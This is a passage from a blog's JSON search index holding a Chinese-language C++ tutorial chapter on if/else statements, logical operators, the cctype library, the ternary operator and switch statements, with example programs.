程序，并了解了不同数据类型在函数参数传递中的行为和最佳实践。","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"C++","slug":"C","permalink":"http://uniqueland.top/tags/C/"}]},{"title":"Chapter 6 分支语句和逻辑运算符","slug":"Cpp_tutorial_Chapter_6","date":"2025-04-26T12:03:35.379Z","updated":"2025-04-26T12:01:50.496Z","comments":true,"path":"2025/04/26/Cpp_tutorial_Chapter_6/","link":"","permalink":"http://uniqueland.top/2025/04/26/Cpp_tutorial_Chapter_6/","excerpt":"","text":"6.1 if语句分支语句允许程序根据特定条件选择执行不同的代码路径。if 语句是 C++ 中最基本的分支结构，它允许程序根据一个条件表达式 (Condition) 的真假来决定是否执行某段代码。 基本语法: 123456789if (condition) &#123; // 如果 condition 为 true，则执行这里的语句 statement1; statement2; // ...&#125;// 或者如果只有一条语句if (condition) single_statement; condition: 一个求值为布尔值 (true 或 false) 的表达式。通常是关系表达式（如 x &gt; 5, name == &quot;Alice&quot;）或逻辑表达式。非零值被视为 true，零值被视为 false。 &#123; ... &#125;: 花括号定义了一个语句块。如果条件为 true，则执行块内的所有语句。如果只有一条语句需要根据条件执行，可以省略花括号，但为了清晰和避免错误，通常推荐总是使用花括号。 执行流程: 计算 condition 的值。 如果 condition 为 true，执行 if 语句后面的语句（或语句块）。 如果 condition 为 false，跳过 if 语句后面的语句（或语句块），继续执行 if 结构之后的代码。 用法与示例: 1234567891011121314151617181920#include &lt;iostream&gt;int main() &#123; int temperature; std::cout &lt;&lt; &quot;Enter the current temperature (Celsius): &quot;; std::cin &gt;&gt; temperature; // 简单的 if 语句 if (temperature &gt; 30) &#123; std::cout &lt;&lt; &quot;It&#x27;s hot outside!&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Remember to stay hydrated.&quot; &lt;&lt; std::endl; &#125; if (temperature &lt; 10) std::cout &lt;&lt; &quot;It&#x27;s cold, wear a jacket!&quot; &lt;&lt; std::endl; // 只有一条语句，可以省略花括号 std::cout &lt;&lt; &quot;Temperature check finished.&quot; &lt;&lt; std::endl; return 0;&#125; 在这个例子中，如果用户输入的 temperature 大于 30，会打印两条消息；如果小于 10，会打印另一条消息；否则，这些 if 块内的代码会被跳过。 6.1.1 if else语句if 语句允许我们在条件为真时执行代码，但如果我们希望在条件为假时执行另一段代码，就需要使用 if else 结构。 语法: 1234567if (condition) &#123; // 如果 condition 为 true，执行这里的语句块 (if block) statement_block_1;&#125; else &#123; // 如果 condition 为 false，执行这里的语句块 (else block) statement_block_2;&#125; 执行流程: 计算 condition 的值。 如果 condition 为 true，执行 if 后面的语句块 (statement_block_1)，然后跳过 else 后面的语句块 (statement_block_2)。 如果 condition 为 false，跳过 if 后面的语句块 (statement_block_1)，执行 else 后面的语句块 (statement_block_2)。 执行完选择的块后，程序继续执行 if else 结构之后的代码。 关键点: if 块和 else 块是互斥的，程序只会执行其中一个。 用法与示例: 12345678910111213141516171819#include &lt;iostream&gt;int main() &#123; int age; std::cout &lt;&lt; &quot;Enter your age: &quot;; std::cin &gt;&gt; age; if (age &gt;= 18) &#123; std::cout &lt;&lt; &quot;You are eligible to vote.&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;You are not yet eligible to vote.&quot; &lt;&lt; std::endl; int years_to_wait = 18 - age; std::cout &lt;&lt; &quot;You need to wait &quot; &lt;&lt; years_to_wait &lt;&lt; &quot; more year(s).&quot; &lt;&lt; std::endl; &#125; std::cout &lt;&lt; &quot;Age check complete.&quot; &lt;&lt; std::endl; return 0;&#125; 这个程序会根据用户输入的年龄，打印两条不同的消息之一。 6.1.2 格式化if else语句清晰的代码格式对于可读性和可维护性至关重要。对于 if else 语句，推荐遵循以下格式化约定： 使用花括号 &#123;&#125;: 即使 if 或 else 后面只有一条语句，也推荐使用花括号。这可以防止在后续添加代码时引入悬挂 else (dangling else) 等错误，并使代码结构更清晰。 缩进: if 和 else 块内部的语句应该相对于 if 和 else 关键字进行缩进（通常是 4 个空格或一个制表符）。 else 的位置: else 关键字通常与对应的 if 语句的右花括号 &#125; 放在同一行，或者单独放在下一行并与 if 对齐。两种风格都很常见。 示例 (推荐的格式): 123456789101112131415161718192021222324// 风格 1: else 与 if 的 &#125; 在同一行if (condition) &#123; // ... statements ...&#125; else &#123; // ... statements ...&#125;// 风格 2: else 单独一行，与 if 对齐if (condition) &#123; // ... statements ...&#125; else &#123; // ... statements ...&#125;// 不推荐的格式 (即使只有一条语句)// if (condition) statement1; else statement2; // 可读性差，易出错// 推荐的格式 (即使只有一条语句)if (condition) &#123; statement1;&#125; else &#123; statement2;&#125; 悬挂 else 问题: 当 if 语句嵌套且省略花括号时，else 会与最近的未匹配的 if 相关联，这可能不符合预期。 123456789101112131415161718int a = 1, b = -1;// 错误的意图 (可能想让 else 对应外层 if)if (a &gt; 0) if (b &gt; 0) std::cout &lt;&lt; &quot;Both positive&quot;;else // 这个 else 实际上对应的是 if (b &gt; 0) std::cout &lt;&lt; &quot;a is not positive&quot;; // 这行不会按预期执行// 正确的写法 (使用花括号明确关联)if (a &gt; 0) &#123; // 外层 if if (b &gt; 0) &#123; // 内层 if std::cout &lt;&lt; &quot;Both positive&quot;; &#125; // 没有 else 对应内层 if&#125; else &#123; // 这个 else 对应外层 if (a &gt; 0) std::cout &lt;&lt; &quot;a is not positive&quot;; &#125; 始终使用花括号可以完全避免悬挂 else 问题。 6.1.3 if else if else结构当需要从多个互斥的选项中选择一个执行路径时，可以使用 if else if else 结构。它本质上是一系列嵌套的 if else 语句，但通常写成更扁平的结构。 语法: 123456789101112131415if (condition1) &#123; // 如果 condition1 为 true，执行这里的语句块 statement_block_1;&#125; else if (condition2) &#123; // 如果 condition1 为 false 且 condition2 为 true，执行这里的语句块 statement_block_2;&#125; else if (condition3) &#123; // 如果 condition1 和 condition2 都为 false 且 condition3 为 true，执行这里的语句块 statement_block_3;&#125; // ... 可以有更多的 else if 分支else &#123; // 如果以上所有条件都为 false，执行这里的语句块 (可选的默认分支) statement_block_default;&#125; 执行流程: 从上到下依次检查每个 if 和 else if 的条件。 一旦找到第一个为 true 的条件，就执行其对应的语句块。 执行完该块后，跳过所有剩余的 else if 和 else 分支，直接执行整个 if else if else 结构之后的代码。 如果所有的 if 和 else if 条件都为 false，则执行最后的 else 块（如果存在）。如果不存在最后的 else 块，则整个结构什么也不执行。 用法与示例: 123456789101112131415161718192021222324252627282930#include &lt;iostream&gt;int main() &#123; int score; std::cout &lt;&lt; &quot;Enter your numerical score (0-100): &quot;; std::cin &gt;&gt; score; char grade; if (score &lt; 0 || score &gt; 100) &#123; std::cout &lt;&lt; &quot;Invalid score entered.&quot; &lt;&lt; std::endl; grade = &#x27;I&#x27;; // Invalid &#125; else if (score &gt;= 90) &#123; grade = &#x27;A&#x27;; &#125; else if (score &gt;= 80) &#123; grade = &#x27;B&#x27;; &#125; else if (score &gt;= 70) &#123; grade = &#x27;C&#x27;; &#125; else if (score &gt;= 60) &#123; grade = &#x27;D&#x27;; &#125; else &#123; // score &lt; 60 grade = &#x27;F&#x27;; &#125; if (grade != &#x27;I&#x27;) &#123; std::cout &lt;&lt; &quot;Your grade is: &quot; &lt;&lt; grade &lt;&lt; std::endl; &#125; return 0;&#125; 这个例子根据分数范围判断对应的等级。程序会按顺序检查条件，一旦满足一个（例如 score &gt;= 80），就会确定等级为 ‘B’，并跳过后续的 else if 和 else。最后的 else 处理所有低于 60 分的情况。 6.2 逻辑表达式在 if 或循环的条件中，我们常常需要组合多个关系表达式或者对某个条件取反。逻辑运算符 (Logical Operators) 用于组合或修改已有的布尔表达式（或可以转换为布尔值的表达式），生成一个新的布尔结果 (true 或 false)。 C++ 主要提供三种逻辑运算符： 逻辑或 (Logical OR): || 逻辑与 (Logical AND): &amp;&amp; 逻辑非 (Logical NOT): ! 6.2.1 逻辑OR运算符：||逻辑或运算符 || 用于连接两个表达式。如果至少有一个操作数为 true，则整个 || 表达式的结果为 true。只有当两个操作数都为 false 时，结果才为 false。 真值表: | 操作数1 | 操作数2 | 操作数1 || 操作数2 || :—— | :—— | :——————- || true | true | true || true | false | true || false | true | true || false | false | false | 用法与示例: || 常用于检查多个条件中是否至少有一个满足。 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;int main() &#123; char input_char; std::cout &lt;&lt; &quot;Enter a character: &quot;; std::cin &gt;&gt; input_char; // 检查字符是否是元音字母 (忽略大小写) if (input_char == &#x27;a&#x27; || input_char == &#x27;e&#x27; || input_char == &#x27;i&#x27; || input_char == &#x27;o&#x27; || input_char == &#x27;u&#x27; || input_char == &#x27;A&#x27; || input_char == &#x27;E&#x27; || input_char == &#x27;I&#x27; || input_char == &#x27;O&#x27; || input_char == &#x27;U&#x27;) &#123; std::cout &lt;&lt; &quot;&#x27;&quot; &lt;&lt; input_char &lt;&lt; &quot;&#x27; is a vowel.&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;&#x27;&quot; &lt;&lt; input_char &lt;&lt; &quot;&#x27; is not a vowel.&quot; &lt;&lt; std::endl; &#125; int age = 25; bool has_ticket = false; // 检查是否满足入场条件 (年龄小于 12 或持有门票) if (age &lt; 12 || has_ticket) &#123; std::cout &lt;&lt; &quot;Allowed entry.&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;Entry denied.&quot; &lt;&lt; std::endl; &#125; return 0;&#125; 6.2.2 逻辑AND运算符：&amp;&amp;逻辑与运算符 &amp;&amp; 用于连接两个表达式。只有当两个操作数都为 true 时，整个 &amp;&amp; 表达式的结果才为 true。只要有至少一个操作数为 false，结果就为 false。 真值表: 操作数1 操作数2 操作数1 &amp;&amp; 操作数2 true true true true false false false true false false false false 用法与示例: &amp;&amp; 常用于检查是否同时满足多个条件。 12345678910111213141516171819202122232425262728#include &lt;iostream&gt;int main() &#123; int age; bool has_id; char id_input; std::cout &lt;&lt; &quot;Enter your age: &quot;; std::cin &gt;&gt; age; std::cout &lt;&lt; &quot;Do you have an ID? (y/n): &quot;; std::cin &gt;&gt; id_input; has_id = (id_input == &#x27;y&#x27; || id_input == &#x27;Y&#x27;); // 检查是否满足购买条件 (年龄大于等于 18 并且持有 ID) if (age &gt;= 18 &amp;&amp; has_id) &#123; std::cout &lt;&lt; &quot;Purchase approved.&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;Purchase denied.&quot; &lt;&lt; std::endl; if (age &lt; 18) &#123; std::cout &lt;&lt; &quot;Reason: Underage.&quot; &lt;&lt; std::endl; &#125; if (!has_id) &#123; // 使用了逻辑非 ! std::cout &lt;&lt; &quot;Reason: No ID presented.&quot; &lt;&lt; std::endl; &#125; &#125; return 0;&#125; 6.2.3 用&amp;&amp;来设置取值范围逻辑与运算符 &amp;&amp; 非常适合用来检查一个值是否落在某个特定的范围内（即同时满足大于某个值和小于另一个值）。 用法与示例: 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;int main() &#123; int score; std::cout &lt;&lt; &quot;Enter your score: &quot;; std::cin &gt;&gt; score; // 检查分数是否在有效范围 [0, 100] 内 if (score &gt;= 0 &amp;&amp; score &lt;= 100) &#123; std::cout &lt;&lt; &quot;Score is valid.&quot; &lt;&lt; std::endl; // 进一步判断等级 if (score &gt;= 60 &amp;&amp; score &lt; 70) &#123; std::cout &lt;&lt; &quot;Grade: D&quot; &lt;&lt; std::endl; &#125; else if (score &gt;= 70 &amp;&amp; score &lt; 80) &#123; std::cout &lt;&lt; &quot;Grade: C&quot; &lt;&lt; std::endl; &#125; // ... 其他等级判断 &#125; else &#123; std::cout &lt;&lt; &quot;Score is invalid (out of range 0-100).&quot; &lt;&lt; std::endl; &#125; // 检查一个字符是否是大写字母 char ch = &#x27;Q&#x27;; if (ch &gt;= &#x27;A&#x27; &amp;&amp; ch &lt;= &#x27;Z&#x27;) &#123; std::cout &lt;&lt; &quot;&#x27;&quot; &lt;&lt; ch &lt;&lt; &quot;&#x27; is an uppercase letter.&quot; &lt;&lt; std::endl; &#125; return 0;&#125; 注意: 不能像数学中那样写 0 &lt;= score &lt;= 100。这在 C++ 中会被解释为 (0 &lt;= score) &lt;= 100。(0 &lt;= score) 的结果是 true (1) 或 false (0)，然后这个 0 或 1 再与 100 比较，结果几乎总是 true，无法正确判断范围。必须使用 &amp;&amp; 连接两个独立的比较。 6.2.4 逻辑NOT运算符：!逻辑非运算符 ! 是一个一元运算符（只需要一个操作数）。它将其操作数的布尔值取反：如果操作数为 true，结果为 false；如果操作数为 false，结果为 true。 真值表: 操作数 !操作数 true false false true 用法与示例: ! 用于反转一个条件的结果。 123456789101112131415161718192021222324252627282930#include &lt;iostream&gt;int main() &#123; bool is_raining = false; int items_in_cart = 0; // 如果不是在下雨 if (!is_raining) &#123; std::cout &lt;&lt; &quot;It&#x27;s not raining. Good day for a walk!&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;It&#x27;s raining. Better stay inside.&quot; &lt;&lt; std::endl; &#125; // 检查购物车是否为空 // items_in_cart == 0 也可以，但 !items_in_cart 更简洁 (利用 0 转换为 false) if (!items_in_cart) &#123; std::cout &lt;&lt; &quot;Your shopping cart is empty.&quot; &lt;&lt; std::endl; &#125; // 检查 cin 读取是否失败 int value; std::cout &lt;&lt; &quot;Enter a number: &quot;; if (!(std::cin &gt;&gt; value)) &#123; // 如果读取失败 (cin 转换为 false), !cin 为 true std::cout &lt;&lt; &quot;Invalid input or EOF.&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;You entered: &quot; &lt;&lt; value &lt;&lt; std::endl; &#125; return 0;&#125; 6.2.5 逻辑运算符细节 优先级 (Precedence): 逻辑非 ! 具有最高的优先级，高于所有关系运算符和算术运算符。 逻辑与 &amp;&amp; 的优先级高于逻辑或 ||。 逻辑运算符的优先级低于关系运算符 (&lt;, ==, != 等)。 赋值运算符 (=) 优先级最低。 *常见优先级顺序 (高到低):** ! 算术运算符 (*, /, %, +, -) 关系运算符 (&lt;, &lt;=, &gt;, &gt;=) 相等运算符 (==, !=) 逻辑与 &amp;&amp; 逻辑或 || 赋值运算符 (=, += 等) 建议: 当不确定优先级或为了提高可读性时，使用括号 () 来明确指定运算顺序。 1if ((age &gt;= 18 &amp;&amp; age &lt; 65) || is_student) &#123; ... &#125; // 括号明确了 &amp;&amp; 先于 || 短路求值 (Short-Circuit Evaluation): &amp;&amp; (逻辑与): 如果 &amp;&amp; 的左侧操作数计算结果为 false，则右侧操作数不会被计算。因为无论右侧是什么，整个表达式的结果都必然是 false。 || (逻辑或): 如果 || 的左侧操作数计算结果为 true，则右侧操作数不会被计算。因为无论右侧是什么，整个表达式的结果都必然是 true。 短路求值非常重要，因为它： 提高效率: 避免了不必要的计算。 允许安全检查: 可以在检查指针有效性后才解引用它，或在除数非零时才执行除法。 *短路求值示例:** 12345678910111213141516171819202122232425262728293031323334#include &lt;iostream&gt;int main() &#123; int divisor = 0; int value = 10; // 安全的除法检查 (因为 divisor 为 0，右侧不会执行) if (divisor != 0 &amp;&amp; value / divisor &gt; 1) &#123; std::cout &lt;&lt; &quot;Result is greater than 1.&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;Divisor is zero or result is not greater than 1.&quot; &lt;&lt; std::endl; &#125; int *ptr = nullptr; // 安全的指针访问 (因为 ptr 为 nullptr，右侧不会执行) if (ptr != nullptr &amp;&amp; ptr-&gt;some_member == 5) &#123; std::cout &lt;&lt; &quot;Pointer member is 5.&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;Pointer is null or member is not 5.&quot; &lt;&lt; std::endl; &#125; int count = 0; // || 的短路 (因为 ++count &gt; 0 为 true，右侧不会执行) if (++count &gt; 0 || some_expensive_function()) &#123; std::cout &lt;&lt; &quot;Condition met. Count is &quot; &lt;&lt; count &lt;&lt; std::endl; // count 变为 1 &#125; return 0;&#125;bool some_expensive_function() &#123; std::cout &lt;&lt; &quot;Expensive function called!&quot; &lt;&lt; std::endl; // 这行不会被打印 return true;&#125; 6.2.6 其他表示方式为了兼容某些可能缺少 |, &amp;, ! 字符的键盘或字符集，C++ 标准定义了一些替代表示（也称为 “digraphs” 或 “alternative tokens”）。这些是关键字，可以直接使用，无需包含特殊头文件。 逻辑运算符 替代表示 &amp;&amp; and ` ! not &amp;= and_eq ` =` ^= xor_eq ~ compl &amp; bitand ` ` ^ xor != not_eq 用法与示例: 12345678910111213141516171819202122232425#include &lt;iostream&gt;int main() &#123; int x = 5, y = 10; bool flag = false; // 使用替代表示 if (x &gt; 0 and y &lt; 20) &#123; // 等价于 x &gt; 0 &amp;&amp; y &lt; 20 std::cout &lt;&lt; &quot;Condition (and) is true.&quot; &lt;&lt; std::endl; &#125; if (x &lt; 0 or y == 10) &#123; // 等价于 x &lt; 0 || y == 10 std::cout &lt;&lt; &quot;Condition (or) is true.&quot; &lt;&lt; std::endl; &#125; if (not flag) &#123; // 等价于 !flag std::cout &lt;&lt; &quot;Condition (not) is true.&quot; &lt;&lt; std::endl; &#125; if (x not_eq y) &#123; // 等价于 x != y std::cout &lt;&lt; &quot;Condition (not_eq) is true.&quot; &lt;&lt; std::endl; &#125; return 0;&#125; 虽然这些替代表示是合法的 C++，但在现代编程实践中，直接使用符号运算符 (&amp;&amp;, ||, !) 更为常见和普遍接受。除非有特定的编码标准或环境限制要求使用替代表示，否则通常坚持使用符号运算符。 6.3 字符函数库cctypeC++ 继承了 C 语言的一个非常有用的函数库，用于处理字符。这个库的 C++ 头文件是 &lt;cctype&gt;，对应的 C 头文件是 &lt;ctype.h&gt;。它提供了一系列函数，可以方便地检查字符的类别（例如，是否是字母、数字、标点符号、空白等）以及转换字符的大小写。 这些函数通常接收一个 int 类型的参数（该参数值应能表示为 unsigned char 或等于 EOF），并返回一个 int 值。对于测试函数，返回非零值（通常解释为 true）表示条件满足，返回零值（解释为 false）表示条件不满足。对于转换函数，返回转换后的字符的整数表示。 包含头文件: 要使用这些函数，需要包含 &lt;cctype&gt; 头文件： 1#include &lt;cctype&gt; 常用的字符测试函数: 函数名 描述 isalnum(ch) 如果 ch 是字母（isalpha）或数字（isdigit），返回 true。 isalpha(ch) 如果 ch 是字母（大写或小写），返回 true。 isblank(ch) (C++11) 如果 ch 是标准空白字符（通常是空格或水平制表符 \\t），返回 true。 iscntrl(ch) 如果 ch 是控制字符（例如 \\n, \\t, ASCII 0-31 和 127），返回 true。 isdigit(ch) 如果 ch 是十进制数字（’0’ 到 ‘9’），返回 true。 isgraph(ch) 如果 ch 是除空格外的任何可打印字符，返回 true。 islower(ch) 如果 ch 是小写字母，返回 true。 isprint(ch) 如果 ch 是任何可打印字符（包括空格），返回 true。 ispunct(ch) 如果 ch 是标点符号（isgraph 为 true 但 isalnum 为 false），返回 true。 isspace(ch) 如果 ch 是标准空白字符（空格、换页 \\f、换行 \\n、回车 \\r、水平制表符 \\t、垂直制表符 \\v），返回 true。 isupper(ch) 如果 ch 是大写字母，返回 true。 isxdigit(ch) 如果 ch 是十六进制数字（’0’-‘9’, ‘a’-‘f’, ‘A’-‘F’），返回 true。 用法与示例 (测试函数): 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;iostream&gt;#include &lt;cctype&gt;#include &lt;string&gt;int main() &#123; std::string text = &quot;Hello World! 123\\t&quot;; int alpha_count = 0; int digit_count = 0; int punct_count = 0; int space_count = 0; std::cout &lt;&lt; &quot;Analyzing text: \\&quot;&quot; &lt;&lt; text &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl; for (char ch : text) &#123; if (isalpha(ch)) &#123; alpha_count++; if (isupper(ch)) &#123; std::cout &lt;&lt; &quot;&#x27;&quot; &lt;&lt; ch &lt;&lt; &quot;&#x27; is uppercase alpha.&quot; &lt;&lt; std::endl; &#125; else &#123; // islower(ch) std::cout &lt;&lt; &quot;&#x27;&quot; &lt;&lt; ch &lt;&lt; &quot;&#x27; is lowercase alpha.&quot; &lt;&lt; std::endl; &#125; &#125; else if (isdigit(ch)) &#123; digit_count++; std::cout &lt;&lt; &quot;&#x27;&quot; &lt;&lt; ch &lt;&lt; &quot;&#x27; is a digit.&quot; &lt;&lt; std::endl; &#125; else if (ispunct(ch)) &#123; punct_count++; std::cout &lt;&lt; &quot;&#x27;&quot; &lt;&lt; ch &lt;&lt; &quot;&#x27; is punctuation.&quot; &lt;&lt; std::endl; &#125; else if (isspace(ch)) &#123; space_count++; std::cout &lt;&lt; &quot;&#x27;&quot; &lt;&lt; ch &lt;&lt; &quot;&#x27; (ASCII &quot; &lt;&lt; int(ch) &lt;&lt; &quot;) is whitespace.&quot; &lt;&lt; std::endl; &#125; else if (iscntrl(ch)) &#123; std::cout &lt;&lt; &quot;&#x27;&quot; &lt;&lt; ch &lt;&lt; &quot;&#x27; (ASCII &quot; &lt;&lt; int(ch) &lt;&lt; &quot;) is a control character.&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;&#x27;&quot; &lt;&lt; ch &lt;&lt; &quot;&#x27; is something else.&quot; &lt;&lt; std::endl; &#125; &#125; std::cout &lt;&lt; &quot;\\nSummary:&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot; Alphabetic: &quot; &lt;&lt; alpha_count &lt;&lt; std::endl; std::cout &lt;&lt; &quot; Digits: &quot; &lt;&lt; digit_count &lt;&lt; std::endl; std::cout &lt;&lt; &quot; Punctuation: &quot; &lt;&lt; punct_count &lt;&lt; std::endl; std::cout &lt;&lt; &quot; Whitespace: &quot; &lt;&lt; space_count &lt;&lt; std::endl; return 0;&#125; 常用的字符转换函数: 函数名 描述 tolower(ch) 如果 ch 是大写字母，返回其对应的小写字母；否则，返回 ch 不变。 toupper(ch) 如果 ch 是小写字母，返回其对应的大写字母；否则，返回 ch 不变。 用法与示例 (转换函数): 12345678910111213141516171819202122232425262728293031323334#include &lt;iostream&gt;#include &lt;cctype&gt;#include &lt;string&gt;int main() &#123; std::string message = &quot;CONVERT This Message.&quot;; std::string lower_message = &quot;&quot;; std::string upper_message = &quot;&quot;; // 转换为小写 for (char ch : message) &#123; lower_message += tolower(ch); // 将每个字符转换为小写并附加 &#125; std::cout &lt;&lt; &quot;Original: &quot; &lt;&lt; message &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Lowercase: &quot; &lt;&lt; lower_message &lt;&lt; std::endl; // 转换为大写 for (char ch : message) &#123; upper_message += toupper(ch); // 将每个字符转换为大写并附加 &#125; std::cout &lt;&lt; &quot;Uppercase: &quot; &lt;&lt; upper_message &lt;&lt; std::endl; // 示例：不区分大小写的比较 char response; std::cout &lt;&lt; &quot;\\nDo you want to continue? (Y/N): &quot;; std::cin &gt;&gt; response; if (tolower(response) == &#x27;y&#x27;) &#123; // 将输入转换为小写再比较 std::cout &lt;&lt; &quot;Continuing...&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;Exiting...&quot; &lt;&lt; std::endl; &#125; return 0;&#125; &lt;cctype&gt; 库提供了一套标准、可移植的函数来处理字符分类和转换，这在处理用户输入、解析文本或进行不区分大小写的操作时非常有用。 6.4 三元运算符C++ 提供了一个简洁的条件运算符，称为三元运算符（或条件运算符），它是 C++ 中唯一一个需要三个操作数的运算符。它通常用于根据条件将两个值中的一个赋给变量。 用法三元运算符的语法如下： 1condition ? expression1 : expression2; 其工作方式是： 首先计算 condition。 如果 condition 为 true（非零），则计算 expression1，并且整个表达式的值就是 expression1 的值。 如果 condition 为 false（零），则计算 expression2，并且整个表达式的值就是 expression2 的值。 三元运算符通常可以替代简单的 if else 语句，使代码更紧凑。 示例代码下面是一个使用三元运算符查找两个数中较大值的示例： 1234567891011121314151617181920#include &lt;iostream&gt;int main() &#123; int a = 10; int b = 20; int max_val; // 使用三元运算符找出 a 和 b 中的较大值 max_val = (a &gt; b) ? a : b; std::cout &lt;&lt; &quot;The maximum value between &quot; &lt;&lt; a &lt;&lt; &quot; and &quot; &lt;&lt; b &lt;&lt; &quot; is: &quot; &lt;&lt; max_val &lt;&lt; std::endl; // 输出: The maximum value between 10 and 20 is: 20 // 另一个例子：根据年龄判断是否成年 int age = 15; std::string status = (age &gt;= 18) ? &quot;Adult&quot; : &quot;Minor&quot;; std::cout &lt;&lt; &quot;Age: &quot; &lt;&lt; age &lt;&lt; &quot;, Status: &quot; &lt;&lt; status &lt;&lt; std::endl; // 输出: Age: 15, Status: Minor return 0;&#125; 代码解释: 在第一个示例中，条件 (a &gt; b) 被评估。因为 10 &gt; 20 是 false，所以计算第二个表达式 b，并将 b 的值（即 20）赋给 max_val。 在第二个示例中，条件 (age &gt;= 18) 被评估。因为 15 &gt;= 18 是 false，所以计算第二个表达式 &quot;Minor&quot;，并将这个字符串赋给 status。 优点: 简洁性: 可以用一行代码替代多行的 if else 结构，使代码更紧凑。 缺点: 可读性: 对于复杂的条件或表达式，使用三元运算符可能会降低代码的可读性。在这种情况下，使用 if else 语句通常更好。 三元运算符是 C++ 中一个方便的工具，尤其适用于简单的条件赋值。 6.5 switch 语句switch 语句是 C++ 中另一种用于控制程序流程的分支结构。它允许程序根据一个表达式的值从多个代码块中选择一个来执行。switch 语句通常用于替代冗长的 if else if else 结构，特别是当判断条件基于单个变量或表达式的离散值时。 用法switch 语句的基本语法如下： 123456789101112switch (expression) &#123; case constant_expression_1: // code block to be executed if expression equals constant_expression_1 break; // 可选，但通常需要 case constant_expression_2: // code block to be executed if expression equals constant_expression_2 break; // 可选 // ... 可以有更多的 case default: // 可选 // code block to be executed if expression doesn&#x27;t match any case break; // 可选&#125; 工作方式: 首先计算 switch 括号内的 expression（表达式）。这个表达式必须得出一个整数类型（如 int, char, enum）或可以隐式转换为整数类型的值。 程序将 expression 的值与每个 case 后面跟着的 constant_expression（常量表达式）进行比较。 如果找到匹配的 case，则执行该 case 标签下的代码块。 break 语句的作用是跳出 switch 结构。如果没有 break，程序会继续执行下一个 case 的代码块（称为“贯穿”），直到遇到 break 或 switch 语句结束。 default 标签是可选的。如果 expression 的值与所有 case 的常量表达式都不匹配，则执行 default 标签下的代码块。如果没有 default 标签且没有匹配的 case，则 switch 语句不执行任何操作。 重要限制: case 标签后面的值必须是常量表达式（如字面值 10、&#39;A&#39; 或 const 整数变量，或者枚举量）。不能是变量或非常量表达式。 expression 的结果必须是整数类型（int, char, short, long, long long, bool, enum 等）。不能是浮点数 (float, double) 或字符串 (std::string)。 示例代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;iostream&gt;int main() &#123; int choice; std::cout &lt;&lt; &quot;Enter a number (1-3): &quot;; std::cin &gt;&gt; choice; switch (choice) &#123; case 1: std::cout &lt;&lt; &quot;You chose option 1.&quot; &lt;&lt; std::endl; break; // 跳出 switch case 2: std::cout &lt;&lt; &quot;You chose option 2.&quot; &lt;&lt; std::endl; break; // 跳出 switch case 3: std::cout &lt;&lt; &quot;You chose option 3.&quot; &lt;&lt; std::endl; break; // 跳出 switch default: std::cout &lt;&lt; &quot;Invalid choice.&quot; &lt;&lt; std::endl; // default 后面通常也放 break，虽然在这里不是必需的，但保持一致性是好习惯 break; &#125; // 演示没有 break 的情况 (贯穿) char grade = &#x27;B&#x27;; std::cout &lt;&lt; &quot;\\nGrade example (fall-through):&quot; &lt;&lt; std::endl; switch (grade) &#123; case &#x27;A&#x27;: std::cout &lt;&lt; &quot;Excellent! &quot;; // 没有 break case &#x27;B&#x27;: std::cout &lt;&lt; &quot;Good! &quot;; // 没有 break case &#x27;C&#x27;: std::cout &lt;&lt; &quot;Passing. &quot;; break; // 在这里跳出 case &#x27;D&#x27;: case &#x27;F&#x27;: // 可以将多个 case 关联到同一代码块 std::cout &lt;&lt; &quot;Needs improvement. &quot;; break; default: std::cout &lt;&lt; &quot;Invalid grade. &quot;; break; &#125; std::cout &lt;&lt; std::endl; // 输出: Good! Passing. return 0;&#125; 代码解释: 第一个 switch 根据用户输入的 choice 值执行相应的 case。break 语句确保只执行匹配 case 的代码。如果输入不是 1、2 或 3，则执行 default 部分。 第二个 switch 演示了“贯穿”行为。因为 case &#39;A&#39; 和 case &#39;B&#39; 后面没有 break，当 grade 为 &#39;B&#39; 时，程序会执行 case &#39;B&#39; 的代码 (std::cout &lt;&lt; &quot;Good! &quot;;)，然后继续执行 case &#39;C&#39; 的代码 (std::cout &lt;&lt; &quot;Passing. &quot;;)，直到遇到 case &#39;C&#39; 中的 break 才跳出 switch。同时，它也展示了如何将多个 case（&#39;D&#39; 和 &#39;F&#39;）关联到同一个代码块。 6.5.1 将枚举量用作标签枚举 (enum) 类型的值是整数常量，因此非常适合用作 switch 语句的 case 标签，这可以提高代码的可读性。 123456789101112131415161718192021222324252627#include &lt;iostream&gt;// 定义一个枚举类型表示颜色enum Color &#123; RED, GREEN, BLUE, YELLOW &#125;;int main() &#123; Color selectedColor = GREEN; switch (selectedColor) &#123; case RED: std::cout &lt;&lt; &quot;The color is Red.&quot; &lt;&lt; std::endl; break; case GREEN: std::cout &lt;&lt; &quot;The color is Green.&quot; &lt;&lt; std::endl; // 这将被执行 break; case BLUE: std::cout &lt;&lt; &quot;The color is Blue.&quot; &lt;&lt; std::endl; break; // 注意：如果 case 覆盖了所有枚举量，可以省略 default， // 但如果枚举可能扩展，或者你想处理无效值，最好加上 default。 default: std::cout &lt;&lt; &quot;Unknown color.&quot; &lt;&lt; std::endl; break; &#125; return 0;&#125; 使用枚举量作为 case 标签比直接使用魔法数字（如 0, 1, 2）更清晰易懂。 6.5.2 switch 和 if elseswitch 语句可以看作是特定类型的 if else if else 结构的替代品，即判断条件都基于同一个整数表达式的值。 何时使用 switch: 当需要根据单个整数表达式的多个特定离散值进行分支时。 